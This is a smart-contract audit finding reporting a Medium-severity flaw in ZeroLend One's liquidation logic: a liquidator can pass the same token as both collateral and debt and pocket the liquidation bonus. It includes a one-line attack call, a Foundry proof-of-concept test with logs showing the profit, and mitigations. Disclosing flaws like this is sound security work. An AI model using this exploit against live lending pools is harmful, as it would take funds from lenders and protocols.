Big Admiral Dove

Medium

# A malicious liquidator could exploit the system to gain debt tokens as profit without any losses

## Summary

In the liquidation logic of the protocol, there is a liquidation bonus to incentivize liquidators.

A malicious attacker can gain profit without any loss after running liquidation by setting a collateral asset with a debt one.

## Root Cause

A validation that checks if the collateral and debt tokens are the same is missing [here](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/ValidationLogic.sol#L214-L229) in the liquidation logic.

This will make it possible to sell debt tokens as collateral and also receive debt tokens with a liquidation bonus.

## Internal pre-conditions

- The debt token should be both collateral and borrow enabled. This is particularly likely because Zerolend pools don't separate collateral tokens from debt tokens so one token can be collateral and borrowal at the same time.

- The target position should be unhealthy (`healthFactor` < 1).

## External pre-conditions

## Attack Path

Once the above internal pre-conditions meet, an attacker can call the `Pool::liquidate()` function with only debt token:
```solidity
    pool.liquidate(debt, debt, pos, debtAmt, data);
```

## Impact

The liquidation logic will receive `debtAmt` debt tokens and transfers `debtAmt * liquidationBonus - liquidationFee` debt tokens to the sender.
As `liquidationBonus` is greater than 100%, the liquidator could gain an unearned income if `debtAmt * liquidationBonus - liquidationFee` - `debtAmt`.

## PoC

Updated `_generateLiquidationCondition()` function like the below in `PoolLiquidationTests.t.sol`:

```diff
  function _generateLiquidationCondition() internal {
    _mintAndApprove(alice, tokenA, mintAmountA, address(pool));
+   _mintAndApprove(alice, tokenB, 10 ether, address(pool)); // <-- Add this line
    _mintAndApprove(bob, tokenB, mintAmountB, address(pool));

    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0); // 550 tokenA alice supply
+   pool.supplySimple(address(tokenB), alice, 10 ether, 0); // <-- Add this line to make tokenB collateral enabled
    vm.stopPrank();

    vm.startPrank(bob);
    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0);
    vm.stopPrank();

    vm.startPrank(alice);
    pool.borrowSimple(address(tokenB), alice, borrowAmountB, 0);
    vm.stopPrank();

    assertEq(tokenB.balanceOf(alice), borrowAmountB);

    oracleA.updateAnswer(5e3);
  }
```

And added a new test case:
```solidity
  function testLiquidationSimpleSameDebtColl() external {
    _generateLiquidationCondition();
    (, uint256 totalDebtBase,,,,) = pool.getUserAccountData(alice, 0);

    vm.startPrank(bob);
    console.log("bob before", tokenB.balanceOf(bob));
    pool.liquidateSimple(address(tokenB), address(tokenB), pos, 10 ether);
    console.log("bob after", tokenB.balanceOf(bob));

    vm.stopPrank();
  }
```

Here are logs of the test case which shows bob's unearned profit:

```bash
Ran 1 test for test/forge/core/pool/PoolLiquidationTests.t.sol:PoolLiquidationTest
[PASS] testLiquidationSimpleSameDebtColl() (gas: 993817)
Logs:
  bob before 1250000000000000000000
  bob after 1250476190476190476190
```

## Mitigation

There are two alternative mitigation options:
1. A validation, that checks if the collateral token and debt token are not the same, should be added to `ValidationLogic`.
2. Should prevent a reserve from simultaneously being collateral and borrowal for one user.

